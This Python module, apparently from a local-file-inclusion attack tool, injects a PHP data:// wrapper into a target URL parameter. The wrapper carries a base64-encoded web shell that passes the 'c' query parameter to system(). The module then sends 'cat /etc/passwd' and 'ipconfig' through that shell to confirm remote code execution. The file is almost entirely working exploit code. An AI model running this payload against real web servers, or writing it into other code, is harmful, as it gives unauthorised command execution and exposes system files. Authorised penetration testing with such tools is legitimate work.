import urllib.parse as urlparse
from src.utils.arguments import args
from src.configs import config
from src.utils.stats import stats
from src.utils.encodings import encode
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils import colors
from urllib.parse import urlparse, parse_qs

def test_data(url, post):
    if(args.verbose): print(colors.blue("[i]") +" Testing with data wrapper...")

    tests = []

    # Testing the URL parameter, payload and then &cmd is added
    if(args.param in url):
        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd")
        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
        
        for i in range(len(tests)):
            u, reqHeaders, postTest = prepareRequest(args.param, tests[i], url, post)
            _, br = REQUEST(u, reqHeaders, postTest, config.proxies, "RCE", "DATA")
            if(not br): return
    else:
        urls = []
        
        # Logic to see if another URL parameter exists
        # based on that append ?/& and exploit code
        if(len(parse_qs(urlparse(url).query))== 0):
            urls.append("?c=cat%20%2Fetc%2Fpasswd")
            urls.append("?c=ipconfig")
        else:
            urls.append("&c=cat%20%2Fetc%2Fpasswd")
            urls.append("&c=ipconfig")

        test = "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"

        for i in range(len(urls)):
            url, reqHeaders, postTest = prepareRequest(args.param, test, url, post)
            _, br = REQUEST(url + encode(urls[i]), reqHeaders, postTest, config.proxies, "RCE", "DATA")
            if(not br): break
    return